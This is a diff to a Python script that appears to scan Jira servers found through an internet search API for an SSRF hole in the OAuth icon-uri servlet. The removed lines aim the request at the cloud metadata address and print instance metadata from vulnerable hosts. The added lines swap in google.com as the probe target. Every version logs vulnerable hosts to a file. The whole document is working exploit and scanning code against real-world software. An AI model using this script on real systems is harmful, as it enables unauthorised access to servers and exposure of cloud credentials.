@@ -16,7 +16,7 @@ requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
 # Configuration
 API_KEY = "YOURAPIKEY"
 SEARCH_FOR = 'http.component:jira'
-FILE = "/plugins/servlet/oauth/users/icon-uri?consumerUri=http://169.254.169.254/latest/meta-data/"
+FILE = "/plugins/servlet/oauth/users/icon-uri?consumerUri=https://www.google.com"
 session = requests.Session()
 
 def filter_result(str):
@@ -34,13 +34,12 @@ def grab_file (IP,PORT,FILE):
 		headers = {"User-Agent":"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:54.0) Gecko/20100101 Firefox/54.0","Connection":"close","Accept-Language":"en-US,en;q=0.5","Accept":"text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8","Upgrade-Insecure-Requests":"1"}
 		response = session.get(URL, headers=headers, timeout=15, verify=False)
 		result = response.text
-		if 'ami-id' in result:
-			if "instance-id" in result:
-				text_file = open("./cfg/jira.cfg", "a")
-				text_file.write("https://"+IP+":"+PORT+"\n")
-				text_file.close()
-				print ("[*] Jira... Found [*]\n")
-				print (result)
+		if '/images/branding/product' in result:
+			text_file = open("./cfg/jira.cfg", "a")
+			text_file.write("https://"+IP+":"+PORT+"\n")
+			text_file.close()
+			print ("[*] Jira... Found [*]\n")
+			print (result)
 		else:
 			print ("[*] Not Vulnerable [*]\n ")
 	except KeyboardInterrupt:
